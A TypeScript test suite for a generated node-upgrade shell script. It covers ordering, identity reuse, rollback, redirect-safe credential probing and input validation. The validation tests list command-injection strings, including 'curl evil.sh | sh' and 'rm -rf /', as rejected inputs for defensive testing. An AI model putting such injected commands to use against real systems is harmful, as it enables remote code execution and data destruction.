/**
 * V4-WP11B — 升级脚本的不变量。
 *
 * 这段脚本是**操作者会直接复制粘贴到生产节点上执行**的东西，所以测试的重点不是
 * "生成了字符串"，而是"脚本里的每一步顺序、身份复用与失败路径都不能被写错"。
 */
import { describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  checkUpgradePrecondition,
  renderNodeUpgradeScript,
  validateAgentImageRef,
  type NodeUpgradeFacts,
} from "../node-upgrade.ts";

const facts: NodeUpgradeFacts = {
  node_key: "hk-in-01",
  agent_id: "81879c3a-7bc5-4be7-84cf-e4ac2dc2849c",
  role: "INGRESS",
  lifecycle: "maintenance",
};

const render = (over: Partial<NodeUpgradeFacts> = {}, image = "ghcr.io/tunex/agent:1.4.0") =>
  renderNodeUpgradeScript({ ...facts, ...over }, image, { panelURL: "https://panel.example.com" });

/**
 * 身份校验段：从它的策略注释一直到最后一行。测试只关心"操作者会看到什么结论"，
 * 所以按这个段的真实边界切，而不是按某个实现细节的字符串。
 */
const identitySection = (script: string) => {
  const start = script.indexOf("# 身份校验只承认一种");
  expect(start).toBeGreaterThan(-1);
  // ⚠️ 这里拿到的是**渲染文本**：探针块位于外层 shell 的单引号串里
  // （`PROBE="$(docker exec … sh -c '…')"`），所以块内的单引号在渲染文本里被写成
  // `'\''`（闭合-转义-重开）。**容器里真正执行的是解转义后的内层脚本**，因此这里必须
  // 把该转义还原——否则测的是外层文本，而不是被测对象。
  // （L56 修复"内层单引号提前终结外层引号 ⇒ 脚本语法非法"之后，这一点才暴露出来。）
  return script.slice(start).replace(/'\\''/g, "'");
};

describe("ordering: never take the node down for a pull that may fail", () => {
  test("the image is pulled before the agent is stopped", () => {
    const { script } = render();
    const pull = script.indexOf("docker pull");
    const stop = script.indexOf("docker stop -t");
    expect(pull).toBeGreaterThan(-1);
    expect(stop).toBeGreaterThan(-1);
    expect(pull).toBeLessThan(stop);
  });

  test("a failed pull exits without touching the running agent", () => {
    const { script } = render();
    const pullBlock = script.slice(script.indexOf("if ! docker pull"), script.indexOf("# ── 2."));
    expect(pullBlock).toContain("die");
    // Nothing that stops or removes the container may appear in that branch.
    expect(pullBlock).not.toContain("docker stop");
    expect(pullBlock).not.toContain("docker rm");
  });

  test("an already-current image is a no-op", () => {
    const { script } = render();
    expect(script).toContain("已经是目标镜像，无需升级");
  });
});

describe("drain: SIGTERM with the container's own stop timeout", () => {
  test("stops with -t and uses the same timeout when recreating", () => {
    const { script } = render();
    expect(script).toContain('docker stop -t "$STOP_TIMEOUT"');
    expect(script).toContain('--stop-timeout "$STOP_TIMEOUT"');
    expect(script).toContain('STOP_TIMEOUT="15"');
  });

  test("the timeout is configurable and reported as the downtime window", () => {
    const rendered = renderNodeUpgradeScript(facts, "ghcr.io/tunex/agent:1.4.0", { stopTimeoutS: 30 });
    expect(rendered.script).toContain('STOP_TIMEOUT="30"');
    expect(rendered.downtime).toContain("30");
  });

  test("the main flow stops gracefully before it removes anything", () => {
    const { script } = render();
    // Assert on the EXECUTED sequence, not on where a helper is defined in the
    // file: `restore_previous` is declared earlier but only runs on failure.
    const mainFlow = script.slice(script.indexOf("# ── 3."));
    const stop = mainFlow.indexOf("docker stop -t");
    const rm = mainFlow.indexOf("docker rm -f");
    expect(stop).toBeGreaterThan(-1);
    expect(rm).toBeGreaterThan(stop);
  });
});

describe("identity: the new container is the SAME node", () => {
  test("reuses only this agent_id's host credential file and LKG state directory", () => {
    const { script } = render();
    expect(script).toContain('CONTAINER="tunex-agent-81879c3a-7bc5-4be7-84cf-e4ac2dc2849c"');
    expect(script).toContain('ENV_FILE="/etc/tunex-agent/instances/81879c3a-7bc5-4be7-84cf-e4ac2dc2849c/agent.env"');
    expect(script).toContain('STATE_DIR="/var/lib/tunex-agent/instances/81879c3a-7bc5-4be7-84cf-e4ac2dc2849c"');
    expect(script).toContain('-v "$ENV_FILE:/run/tunex-agent/agent.env:ro"');
    expect(script).toContain('-v "$STATE_DIR:/var/lib/tunex-agent"');
    expect(script).toContain('--name "$CONTAINER"');
    expect(script).toContain('--label "io.tunex.agent-id=$AGENT_ID"');
  });

  test("legacy fallback is allowed only when legacy agent.env proves the same agent_id", () => {
    const { script } = render();
    const fallback = script.slice(script.indexOf("# New installs use tunex-agent-<agent_id>"), script.indexOf("# ── 0."));
    expect(fallback).toContain('LEGACY_AGENT_ID="$(read_env_value TUNEX_AGENT_ID "$LEGACY_ENV_FILE")"');
    expect(fallback).toContain('[ "$LEGACY_AGENT_ID" = "$AGENT_ID" ]');
    expect(fallback).toContain('CONTAINER="$LEGACY_CONTAINER"');
    expect(fallback).not.toContain('. "$LEGACY_ENV_FILE"');
  });

  test("upgrade recreation cannot delete a sibling Agent container", () => {
    const { script } = render();
    expect(script).toContain('docker rm -f "$CONTAINER"');
    expect(script).not.toContain("docker rm -f tunex-agent >/dev/null");
    expect(script).not.toContain("docker stop -t 15 tunex-agent");
  });

  test("a custom container name still has to prove it belongs to this agent_id", () => {
    const { script } = renderNodeUpgradeScript(facts, "ghcr.io/tunex/agent:1.4.0", {
      panelURL: "https://panel.example.com",
      containerName: "custom-agent-container",
    });
    expect(script).toContain('CONTAINER="custom-agent-container"');
    expect(script).toContain('CONTAINER_AGENT_ID="$(docker inspect --format');
    expect(script).toContain('[ "$CONTAINER_AGENT_ID" = "$AGENT_ID" ] || die');
    expect(script).toContain("属于另一个 Agent");
    expect(script).toContain("没有可验证的当前 agent_id 标签");
  });

  test("no new enrollment happens, and the script says so", () => {
    const { script, preserves } = render();
    // No enrollment API call and no one-time token: identity comes from the host
    // credential file that already exists.
    expect(script).not.toContain("/api/internal/node/enroll");
    expect(script).not.toContain("Enrollment ");
    expect(script).not.toContain("enroll-token");
    expect(preserves).toEqual({ node_identity: true, credential: true, lkg_state: true, forwards: true });
  });

  test("verifies the new process still authenticates, printing only an HTTP code", () => {
    const { script } = render();
    expect(script).toContain("/api/internal/node/snapshot");
    expect(script).toContain("TUNEX_NODE_CREDENTIAL");
    expect(script).toContain("%{http_code}");
    // The credential is read inside the container, never echoed by the script.
    expect(script).not.toMatch(/echo[^\n]*TUNEX_NODE_CREDENTIAL/);
    expect(script).not.toMatch(/printf[^\n]*TUNEX_NODE_CREDENTIAL/);
  });

  test("a failed identity check rolls back instead of leaving a broken node", () => {
    const block = identitySection(render().script);
    // Rollback is reserved for an explicit authentication failure: exactly one
    // restore_previous call, and it lives in the 401/403 branch.
    expect(block.match(/restore_previous/g)).toHaveLength(1);
    const before = block.slice(0, block.indexOf("restore_previous"));
    const label = before.indexOf("http:401|http:403)");
    expect(label).toBeGreaterThan(-1);
    const branchBody = before.slice(label + "http:401|http:403)".length);
    expect(branchBody).toContain("身份校验失败（HTTP");
    for (const other of ["http:200)", "http:*)", "unverified:no_response)"]) {
      expect(branchBody).not.toContain(other);
    }
  });
});

describe("identity check on the real Agent image: executable, and never a false 'verified'", () => {
  // The standard Alpine runtime has no curl, and `docker exec` sees the container's
  // Config.Env (not the entrypoint's sourced agent.env), so the previous in-container
  // curl check could never pass on a real node. These tests pin the two facts that
  // make it work instead: read the credential from the mounted env file, and use a
  // tool the image actually ships.

  test("sources the credential from the mounted agent.env inside the container", () => {
    const block = identitySection(render().script);
    const exec = block.indexOf("docker exec");
    const sourced = block.indexOf('. "$ENV_FILE"');
    const used = block.indexOf("TUNEX_NODE_CREDENTIAL");
    expect(exec).toBeGreaterThan(-1);
    expect(sourced).toBeGreaterThan(exec);
    expect(used).toBeGreaterThan(sourced);
    // 容器内的默认路径仍然是节点上的标准位置：`docker exec` 显式把它作为 $3 传进去。
    expect(block).toContain('sh "$PANEL" "$CHECK_TIMEOUT" /run/tunex-agent/agent.env');
  });

  test("does not assume curl: probes curl, then falls back to busybox wget", () => {
    const block = identitySection(render().script);
    expect(block).toContain("command -v curl");
    expect(block).toContain("command -v wget");
    expect(block.indexOf("command -v wget")).toBeGreaterThan(block.indexOf("command -v curl"));
    // wget carries the same header and its status line is parsed, not guessed.
    expect(block).toContain('--header "Authorization: Bearer $TUNEX_NODE_CREDENTIAL"');
    expect(block).toContain('grep -oE "HTTP/[0-9.]+ [0-9]{3}"');
  });

  test("curl 分支不跟随重定向（凭据只发给原地址），且带 --max-time", () => {
    const block = identitySection(render().script);
    const curlCall = block.slice(block.indexOf("command -v curl"), block.indexOf("elif command -v wget"));
    // 只看**真正执行的那一行**（注释里会出现 "-L" 这个词，别拿它当证据）。
    const curlLine = curlCall.split("\n").find((line) => line.includes('CODE="$(curl')) ?? "";
    expect(curlLine).toContain("curl -sS");
    // 不写 -L/--location：curl 就不会跟随 3xx，Authorization 只会发给我们真正要
    // 校验的那个地址（凭据不被跳转带出容器的那一条）。
    expect(curlLine).not.toMatch(/(^|\s)-L(\s|$)/);
    expect(curlLine).not.toContain("--location");
    // 防呆：万一有人加了 -L，--max-redirs 0 会让 curl 失败而不是跟随。
    expect(curlLine).toContain("--max-redirs 0");
    expect(curlLine).toContain('--max-time "$2"');
    // 凭据确实在这一条请求上（否则校验没有意义）。
    expect(curlLine).toContain('"Authorization: Bearer $TUNEX_NODE_CREDENTIAL"');
  });

  test("标准 Agent 镜像不装 curl/jq：身份校验由 agent 二进制自带的探针完成", () => {
    // 这条不变量是"凭据不被 3xx 带出容器"的**前提**：busybox wget 无法禁止跟随重定向，
    // 所以唯一的办法是让镜像里有 curl。删掉这一行会让生产镜像悄悄退回 wget 分支 ——
    // 结论仍然正确（未校验），但凭据会被重发到跳转目标。
    const dockerfile = readFileSync(new URL("../../../../agent/Dockerfile", import.meta.url), "utf8");
    const runtimeStage = dockerfile.slice(dockerfile.lastIndexOf("FROM alpine"));
    // task-29 收口：探针由二进制自己做（Go stdlib：永不跟随重定向 + 真解析），
    // 因此 runtime 阶段**不再**需要 curl/jq —— 那两件工具曾经让镜像 +6.1MB，
    // 而且 "curl / wget / 无 jq" 三条路径的结论必须一致本身就是缺陷源。
    expect(runtimeStage).not.toContain("apk add --no-cache curl");
    expect(runtimeStage).not.toContain("apk add --no-cache jq");
    // 但必须说清身份校验走的哪条路（否则下一个人会以为是漏装）。
    expect(runtimeStage).toContain("identity-probe");
    expect(runtimeStage).toContain("ErrUseLastResponse");
  });

  test("wget takes the FIRST status line, never the last one (busybox follows redirects)", () => {
    // busybox wget 1.37 没有 `--max-redirect`，无法禁止跟随重定向；`-S` 会把每一跳的
    // 状态行都打出来。取最后一行的话，"302 → /login(200)" 会被读成 200 并打印"通过"。
    const block = identitySection(render().script);
    expect(block).toContain('grep -oE "HTTP/[0-9.]+ [0-9]{3}" "$HDR" | head -n 1');
    expect(block).not.toContain("tail -n 1 | grep -oE");
  });

  test("首选路径是 agent 内置探针，shell 探针只在它不可用时兜底（顺序即纪律）", () => {
    const block = identitySection(render().script);
    // 首选：agent 二进制 + 它自己的旗标（不是子命令 —— 位置参数会被老二进制当成
    // "多余参数"而照常启动运行时）。
    for (const needle of [
      "--identity-probe",
      '--probe-url "$1"',
      '--probe-timeout "$2"',
      '--probe-env-file "$3"',
      "command -v tunex-agent",
      "/usr/local/bin/tunex-agent",
    ]) {
      expect(block).toContain(needle);
    }
    // 只接受词表里的结论：老二进制吐的是 usage 文本（stdout），必须被当成"没有结论"。
    expect(block).toContain('http:*) printf "%s');
    expect(block).toContain('unverified:*) printf "%s');
    expect((block.match(/\"\$OUT\"; exit 0 ;;/g) ?? []).length).toBe(2);
    // 顺序：内置探针必须在 curl/wget 兜底**之前**。
    expect(block.indexOf("--identity-probe")).toBeLessThan(block.indexOf("command -v curl"));
    // 三种判定手段在操作者文案里必须可分（agent 首选 / jq 兜底 / grep 形状匹配）。
    expect(block).toContain("agent 内置探针，不跟随重定向");
    expect(block).toContain("兜底路径 jq");
    expect(block).toContain("形状匹配");
  });

  test("a 200 without a real Panel JSON body is 未校验, not 通过", () => {
    const block = identitySection(render().script);
    expect(block).toContain("unverified:not_panel_json");
    // 真解析（镜像里有 jq 时走这条）。
    expect(block).toContain(`jq -e 'type=="object" and (.data|type=="object")' "$BODY"`);
    // 形状匹配只作为**没有 jq** 的兜底，且必须被标注成形状匹配而不是解析。
    expect(block).toContain('grep -qE "\\"data\\"[[:space:]]*:" "$BODY"');
    expect(block).toContain('SHAPE="jq"');
    expect(block).toContain('SHAPE="grep"');
    expect(block).toContain('printf "http:200:%s\\n" "$SHAPE"');
    expect(block).toContain("REASON=\"Panel 回了 HTTP 200，但响应体不是 Panel 的 JSON");
  });

  test("判定手段随镜像能力如实区分：jq=真解析，grep=形状匹配（且明说不是解析）", () => {
    const script = render().script;
    const block = identitySection(script);
    // 通过那一行有**两个**分支：真解析 / 形状匹配 + 一条"没有 jq"的提醒。
    expect(block).toContain("Panel JSON 真解析");
    expect(block).toContain("Panel JSON 形状匹配");
    expect(block).toContain("本节点镜像既没有内置探针、也没有 jq，响应体只做了形状匹配、没有真解析");
    // 操作者可见的"身份校验通过"只出现在**三种判定手段**各一条 log 里
    // （agent 内置探针 / jq 兜底 / grep 形状匹配），不允许别处冒出第四个"通过"口径。
    expect(script.match(/log "身份校验通过/g)).toHaveLength(3);
  });

  test("only an explicit HTTP 200 counts as verified", () => {
    const block = identitySection(render().script);
    expect(block.match(/VERIFIED="yes"/g)).toHaveLength(1);
    // 通往"通过"的 case 臂仍然只以 http:200 开头（后缀只区分判定手段：jq / grep）。
    expect(block.slice(0, block.indexOf('VERIFIED="yes"'))).toMatch(/http:200:\*\)\s*$/);
    // "verified" is claimed in exactly one operator-facing line, and it is the
    // one that the 200 branch prints.
    expect(render().script.match(/身份校验：通过/g)).toHaveLength(1);
  });

  test("a missing panel URL is reported as 未校验, with the config gap named", () => {
    const block = identitySection(renderNodeUpgradeScript(facts, "ghcr.io/tunex/agent:1.4.0", { panelURL: null }).script);
    expect(block).toContain("unverified:no_panel_url");
    expect(block).toContain("未配置 TUNEX_PUBLIC_PANEL_URL");
    expect(block).toContain("身份校验：未校验");
    // The old silent skip is gone.
    expect(block).not.toContain("跳过身份校验");
  });

  test("falls back to the panel address the node recorded in agent.env", () => {
    const block = identitySection(render().script);
    expect(block).toContain('BASE="${TUNEX_PANEL_HTTP_URL:-}"');
  });

  test("every unverifiable outcome has its own explicit reason", () => {
    const block = identitySection(render().script);
    for (const reason of [
      "unverified:no_panel_url",
      "unverified:env_unreadable",
      "unverified:no_credential",
      "unverified:no_http_tool",
      "unverified:no_response",
      "unverified:not_panel_json",
    ]) {
      expect(block).toContain(reason);
    }
    // Non-200 status codes and a dead `docker exec` are also 未校验, never a pass.
    expect(block).toContain("http:*)");
    expect(block).toContain("REASON=\"完全没有取到可判定的结论（docker exec 可能失败）\"");
    expect(block).toContain("身份校验：未校验 —— $REASON");
    expect(block).toContain("本次升级没有通过身份校验");
  });

  test("the check is time-bounded so a hung request cannot stall the upgrade", () => {
    const block = identitySection(render().script);
    expect(render().script).toContain('CHECK_TIMEOUT="15"');
    expect(block).toContain('sh "$PANEL" "$CHECK_TIMEOUT"');
    expect(block).toContain('--max-time "$2"');
    expect(block).toContain('-T "$2"');
    expect(block).toContain("unverified:no_response");
  });

  test("the timeout is configurable", () => {
    const script = renderNodeUpgradeScript(facts, "ghcr.io/tunex/agent:1.4.0", {
      panelURL: "https://panel.example.com",
      checkTimeoutS: 5,
    }).script;
    expect(script).toContain('CHECK_TIMEOUT="5"');
  });
});

/* ================================================================== */
/* 身份校验：把**渲染出来的那段探针**用真实 sh 跑一遍                       */
/* ================================================================== */

/**
 * 从操作者会执行的脚本里取出容器内的探针文本（`docker exec … sh -c '<这段>'`）。
 *
 * 刻意不去 import 一个"探针生成函数"再跑它：那样测的是"我以为脚本里写了什么"，
 * 这里测的是"脚本里**确实**写了什么"。探针体内不含单引号，所以这个截取是安全的，
 * 取不到就直接抛（避免静默地测了个空）。
 */
/**
 * 把渲染文本里的"内层脚本"还原成**容器里真正执行的那份**。
 *
 * 探针块位于外层 shell 的单引号串里（`PROBE="$(docker exec … sh -c '…')"`），因此块内出现的
 * 单引号在**渲染文本**里必须写成 `'\''`（闭合-转义-重开）。直接拿渲染文本当脚本跑，测的是
 * 外层文本而不是被测对象 —— 修复"内层单引号提前终结外层引号 ⇒ 脚本语法非法"（L56 实测：
 * `bash -n` / `dash -n` 双双 rc=2、任何节点都无法升级）之后，这一点才暴露：未还原时内层脚本
 * 里会留下 `'\''` 四个字符，`sh` 解析到 `(.data|…)` 的 `(` 直接语法错，探针用例全部拿到空串。
 */
const unescapeInnerBlock = (raw: string) => raw.replace(/'\\''/g, "'");

function probeBody(script: string): string {
  const match = script.match(/docker exec "\$CONTAINER" sh -c '([\s\S]*?)' sh /);
  if (!match) throw new Error("rendered upgrade script is missing the in-container identity probe");
  return unescapeInnerBlock(match[1]!);
}

type PanelMode =
  | "ok"
  | "redirect"
  | "html200"
  | "json200"
  | "badjson200"
  // "有 data 键、外层形状也对，但不是合法 JSON" —— 形状匹配会放它过去，真解析不会。
  | "datafakejson200"
  // 合法 JSON、但 data 不是对象（`{"data":42}`）—— `has("data")` 会放过它。
  | "datanum200"
  | "500"
  | "401"
  | "404";

/**
 * 假 Panel：只回一种形状。`redirect` 复现真实缺陷（302 → /login(200)），其余是
 * "200 但响应体不是 Panel JSON" 的几种外壳（门户页 / catch-all / 别的 JSON）。
 */
function startFakePanel(mode: PanelMode) {
  const counter = { seen: 0 };
  const server = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    fetch(req) {
      counter.seen += 1;
      const path = new URL(req.url).pathname;
      if (path === "/login") return new Response("<html>login page</html>", { headers: { "content-type": "text/html" } });
      switch (mode) {
        case "ok":
          return Response.json({ data: { snapshot: null } });
        case "redirect":
          return new Response("<html>login</html>", {
            status: 302,
            headers: { location: "/login", "content-type": "text/html" },
          });
        case "html200":
          return new Response("<html><body>panel portal</body></html>", { headers: { "content-type": "text/html" } });
        case "json200":
          return Response.json({ foo: "bar" });
        case "badjson200":
          return new Response("{oops", { headers: { "content-type": "application/json" } });
        case "datafakejson200":
          // 外层形状齐全（`{` 开头、有 "data":、`}` 收尾）但**不是合法 JSON**：
          // 这正是三条 grep 的形状匹配会误判成"Panel 的响应"的那一类。
          return new Response('{"data": oops}', { headers: { "content-type": "application/json" } });
        case "datanum200":
          return new Response('{"data":42}', { headers: { "content-type": "application/json" } });
        default:
          return new Response("{}", { status: Number(mode), headers: { "content-type": "application/json" } });
      }
    },
  });
  // 请求计数：用来证明"内置探针给了结论之后，兜底路径没有再打一次请求"。
  Object.defineProperty(server, "seenCount", { get: () => counter.seen });
  return server as typeof server & { readonly seenCount: number };
}

/** 只暴露探针真正用到的那几个工具（外加 curl/wget 之一），用来逼出两条分支。 */
function restrictedPath(dir: string, tools: string[]): string {
  const bin = join(dir, "bin");
  mkdirSync(bin, { recursive: true });
  for (const tool of tools) {
    const found = ["/usr/bin", "/bin", "/usr/local/bin"]
      .map((base) => join(base, tool))
      .find((candidate) => existsSync(candidate));
    if (!found) throw new Error(`test host is missing '${tool}'`);
    symlinkSync(found, join(bin, tool));
  }
  return bin;
}

const SH = ["/bin/sh", "/usr/bin/sh"].find((candidate) => existsSync(candidate)) ?? "sh";

/**
 * 一次探针运行的完整环境：独立临时目录 + agent.env + 受控 PATH。
 *
 * `agentProbe` 非空时，在 PATH 里放一个**假的 `tunex-agent`**（内容就是给它的 shell 正文），
 * 用来分别模拟"新版镜像有内置探针""老镜像的二进制不认识该标志"两种形态。
 */
function probeSandbox(tools: string[], agentProbe?: string) {
  const dir = mkdtempSync(join(tmpdir(), "tunex-upgrade-probe-"));
  const envFile = join(dir, "agent.env");
  writeFileSync(envFile, "TUNEX_NODE_CREDENTIAL=probe-test-credential\n");
  const bin = restrictedPath(dir, tools);
  if (agentProbe !== undefined) {
    writeFileSync(join(bin, "tunex-agent"), `#!/bin/sh\n${agentProbe}\n`, { mode: 0o755 });
  }
  return { dir, envFile, bin };
}

/**
 * 用真实 sh 跑一段探针；走 curl 还是 wget 由 PATH 里放了哪个工具决定。
 *
 * 必须是**异步** spawn：假 Panel 就跑在同一个进程里（`Bun.serve`），同步 spawn 会把
 * 事件循环堵死，服务端永远回不了响应（实测 curl 28 超时、0 字节）。
 */
async function runProbe(body: string, base: string, bin: string, envFile: string): Promise<string> {
  const proc = Bun.spawn([SH, "-c", body, "sh", base, "5", envFile], {
    env: { PATH: bin },
    stdout: "pipe",
    stderr: "pipe",
  });
  const out = await new Response(proc.stdout).text();
  await proc.exited;
  return out.trim();
}

/** 跑一条命令并拿回 stdout/stderr（同样是异步，理由见 `runProbe`）。 */
async function runCommand(argv: string[]): Promise<{ stdout: string; stderr: string; code: number }> {
  const proc = Bun.spawn(argv, { stdout: "pipe", stderr: "pipe" });
  const [stdout, stderr] = await Promise.all([
    new Response(proc.stdout).text(),
    new Response(proc.stderr).text(),
  ]);
  const code = await proc.exited;
  return { stdout, stderr, code };
}

const EXPECTED: Record<PanelMode, string> = {
  ok: "http:200",
  redirect: "http:302",
  html200: "unverified:not_panel_json",
  json200: "unverified:not_panel_json",
  badjson200: "unverified:not_panel_json",
  // 有 data 键 + 外层形状对、但不是合法 JSON；`{"data":42}` 是合法 JSON 但 data 不是对象。
  // 两者都必须"未校验"——形状匹配（没有 jq 的镜像）会放它们过去，这就是要真解析的理由。
  datafakejson200: "unverified:not_panel_json",
  datanum200: "unverified:not_panel_json",
  "500": "http:500",
  "401": "http:401",
  "404": "http:404",
};

/**
 * 把探针输出归一成**结论**：`http:200:jq` 与 `http:200:grep` 都是"通过"，
 * 后缀只说明用的是真解析还是形状匹配（镜像里有没有 jq）。
 */
function verdict(token: string): string {
  return token.startsWith("http:200:") ? "http:200" : token;
}

describe("identity probe behaviour: a 302 or a non-Panel 200 is never 通过", () => {
  const body = probeBody(render().script);

  test("curl 与 wget 两条分支对同一个响应给同一结论（含 302 与各种假 200）", async () => {
    const curlBox = probeSandbox(["curl", "grep", "head", "mktemp", "rm", "jq"]);
    const wgetBox = probeSandbox(["wget", "grep", "head", "mktemp", "rm", "jq"]);
    try {
      for (const mode of Object.keys(EXPECTED) as PanelMode[]) {
        const panel = startFakePanel(mode);
        try {
          const base = `http://127.0.0.1:${panel.port}`;
          const viaCurl = await runProbe(body, base, curlBox.bin, curlBox.envFile);
          const viaWget = await runProbe(body, base, wgetBox.bin, wgetBox.envFile);
          expect(`${mode}: curl=${verdict(viaCurl)}`).toBe(`${mode}: curl=${EXPECTED[mode]}`);
          expect(`${mode}: wget=${verdict(viaWget)}`).toBe(`${mode}: wget=${EXPECTED[mode]}`);
          // 两条分支必须给出**同一个**结论，且后缀（判定手段）也一致：这两个 sandbox
          // 都放了 jq，所以两条分支都走**真解析**。
          expect(viaCurl).toBe(viaWget);
          if (mode === "ok") {
            expect(viaCurl).toBe("http:200:jq");
            expect(viaWget).toBe("http:200:jq");
          }
        } finally {
          panel.stop(true);
        }
      }
    } finally {
      rmSync(curlBox.dir, { recursive: true, force: true });
      rmSync(wgetBox.dir, { recursive: true, force: true });
    }
  }, 60_000);

  test("302 → /login(200) 的证据链：wget 真的跟随重定向，最后一跳是 200（旧的 tail -n 1 读到的就是它）", async () => {
    const box = probeSandbox(["wget", "grep", "head", "mktemp", "rm"]);
    const panel = startFakePanel("redirect");
    try {
      const base = `http://127.0.0.1:${panel.port}`;
      const raw = await runCommand([
        join(box.bin, "wget"),
        "-S",
        "-O",
        "/dev/null",
        "-T",
        "5",
        "--header",
        "Authorization: Bearer probe-test-credential",
        `${base}/api/internal/node/snapshot`,
      ]);
      const hops = raw.stderr.match(/HTTP\/[0-9.]+ [0-9]{3}/g) ?? [];
      expect(hops.length).toBeGreaterThan(1); // 真的跟随了重定向（不是单跳）
      expect(hops[0]).toContain("302");
      expect(hops[hops.length - 1]).toContain("200"); // 旧实现的 `tail -n 1` 读到的就是它
      // 而脚本的结论来自第一跳，所以是 未校验，不是"通过"。
      expect(await runProbe(body, base, box.bin, box.envFile)).toBe("http:302");
    } finally {
      panel.stop(true);
      rmSync(box.dir, { recursive: true, force: true });
    }
  }, 30_000);

  test("容器里既没有 curl 也没有 wget 时是 未校验（不是通过）", async () => {
    const box = probeSandbox(["grep", "head", "mktemp", "rm"]);
    const panel = startFakePanel("ok");
    try {
      const base = `http://127.0.0.1:${panel.port}`;
      expect(await runProbe(body, base, box.bin, box.envFile)).toBe("unverified:no_http_tool");
    } finally {
      panel.stop(true);
      rmSync(box.dir, { recursive: true, force: true });
    }
  }, 30_000);

  test("没有 jq 的镜像：退回形状匹配，如实报成 http:200:grep（并暴露它放过了什么）", async () => {
    const body = probeBody(render().script);
    const withJq = probeSandbox(["curl", "grep", "head", "mktemp", "rm", "jq"]);
    const noJq = probeSandbox(["curl", "grep", "head", "mktemp", "rm"]); // 老镜像：没有 jq
    const okPanel = startFakePanel("ok");
    const fakeJsonPanel = startFakePanel("datafakejson200");
    try {
      // 正例：两条路都能判"通过"，但**判定手段必须如实区分**。
      const okBase = `http://127.0.0.1:${okPanel.port}`;
      expect(await runProbe(body, okBase, withJq.bin, withJq.envFile)).toBe("http:200:jq");
      expect(await runProbe(body, okBase, noJq.bin, noJq.envFile)).toBe("http:200:grep");
      // 残留：`{"data": oops}`（有 data 键、外层形状对，但不是合法 JSON）
      //   · 有 jq ⇒ 真解析发现它不是 JSON ⇒ 未校验；
      //   · 没有 jq ⇒ 形状匹配**放过**它，只报成"通过（形状匹配）"。
      // 这条断言就是"为什么必须装 jq"的证据，也把兜底的边界钉在明面上。
      const fakeBase = `http://127.0.0.1:${fakeJsonPanel.port}`;
      expect(await runProbe(body, fakeBase, withJq.bin, withJq.envFile)).toBe("unverified:not_panel_json");
      expect(await runProbe(body, fakeBase, noJq.bin, noJq.envFile)).toBe("http:200:grep");
    } finally {
      okPanel.stop(true);
      fakeJsonPanel.stop(true);
      rmSync(withJq.dir, { recursive: true, force: true });
      rmSync(noJq.dir, { recursive: true, force: true });
    }
  }, 30_000);
});

describe("rollback anchor", () => {
  test("records the running image before changing anything", () => {
    const { script } = render();
    const anchor = script.indexOf('PREVIOUS_IMAGE="$(docker inspect');
    const pull = script.indexOf("docker pull");
    expect(anchor).toBeGreaterThan(-1);
    expect(anchor).toBeLessThan(pull);
  });

  test("refuses to continue when the anchor cannot be read", () => {
    const { script } = render();
    expect(script).toContain("拒绝在没有回退锚点的情况下继续");
  });

  test("a container that exits immediately is rolled back", () => {
    const { script } = render();
    const startBlock = script.slice(script.indexOf("sleep 3"), script.indexOf("# 身份校验只承认一种"));
    expect(startBlock).toContain("restore_previous");
  });
});

describe("the script never carries a credential", () => {
  test("no credential-shaped value is present", () => {
    const { script } = render();
    expect(script).not.toMatch(/Bearer\s+[A-Za-z0-9._~+/=-]{8,}/);
    expect(script).not.toContain("-----BEGIN");
    expect(script).not.toMatch(/\b[0-9a-fA-F]{32,}\b/);
  });

  test("a digest-pinned image is allowed (a digest is not a secret)", () => {
    const digest = `ghcr.io/tunex/agent@sha256:${"a".repeat(64)}`;
    const { script } = render({}, digest);
    expect(script).toContain(digest);
  });

  test("a caller cannot smuggle a token through a rendered field", () => {
    expect(() =>
      renderNodeUpgradeScript(facts, "ghcr.io/tunex/agent:1.4.0", {
        panelURL: "https://panel.example.com/?token=AbCdEf0123456789AbCdEf0123456789",
      }),
    ).toThrow(/credential-shaped/);
  });

  test("shell metacharacters in a rendered field cannot escape into a command", () => {
    const { script } = render({ node_key: "hk-01; rm -rf / #" });
    expect(script).not.toContain("rm -rf /");
  });
});

describe("image reference validation", () => {
  test("accepts normal references, with and without tag or digest", () => {
    for (const image of [
      "tunex/agent:1.4.0",
      "ghcr.io/tunex/agent",
      "ghcr.io/tunex/agent:1.4.0-rc.1",
      `ghcr.io/tunex/agent@sha256:${"b".repeat(64)}`,
      "registry.internal:5000/tunex/agent:v2",
    ]) {
      expect(validateAgentImageRef(image)).toEqual({ ok: true, image });
    }
  });

  test("refuses anything that could break out of the script", () => {
    for (const bad of [
      "agent:1.0; curl evil.sh | sh",
      "agent:1.0 && rm -rf /",
      "agent:1.0$(whoami)",
      "agent:1.0`id`",
      "agent:1.0\nRUN evil",
      "agent:1.0 | tee /etc/passwd",
      ">agent:1.0",
      "",
      "   ",
      null,
      42,
      "x".repeat(300),
    ]) {
      const result = validateAgentImageRef(bad);
      expect(result.ok).toBe(false);
    }
  });

  test("surrounding whitespace is trimmed, not accepted verbatim", () => {
    // Whatever is validated is what lands in the script, so the value is the
    // trimmed one — a paste with a stray space must not reject a valid image.
    expect(validateAgentImageRef("  agent:1.0  ")).toEqual({ ok: true, image: "agent:1.0" });
  });
});

describe("preconditions encode the maintenance-before-upgrade rule", () => {
  test("refuses an active node and explains why", () => {
    const result = checkUpgradePrecondition({ ...facts, lifecycle: "active" });
    expect(result.ok).toBe(false);
    expect(result.code).toBe("node_not_in_maintenance");
    expect(result.message).toContain("maintenance");
  });

  test("allow_active is an explicit, auditable override", () => {
    expect(checkUpgradePrecondition({ ...facts, lifecycle: "active" }, { allowActive: true }).ok).toBe(true);
  });

  test("an installed maintenance node may upgrade", () => {
    expect(checkUpgradePrecondition(facts).ok).toBe(true);
  });

  test("a retired node is a one-way door and cannot be upgraded", () => {
    const result = checkUpgradePrecondition({ ...facts, lifecycle: "retired" }, { allowActive: true });
    expect(result.ok).toBe(false);
    expect(result.code).toBe("node_retired");
  });

  test("a node with no agent identity is refused (nothing to preserve)", () => {
    const result = checkUpgradePrecondition({ ...facts, agent_id: "" }, { allowActive: true });
    expect(result.ok).toBe(false);
    expect(result.code).toBe("node_has_no_agent_id");
  });
});

/* ================================================================== */
/* 凭据外发：3xx 指向**另一台 host** 时，凭据不得被重发                     */
/* ================================================================== */

interface SeenProbeRequest {
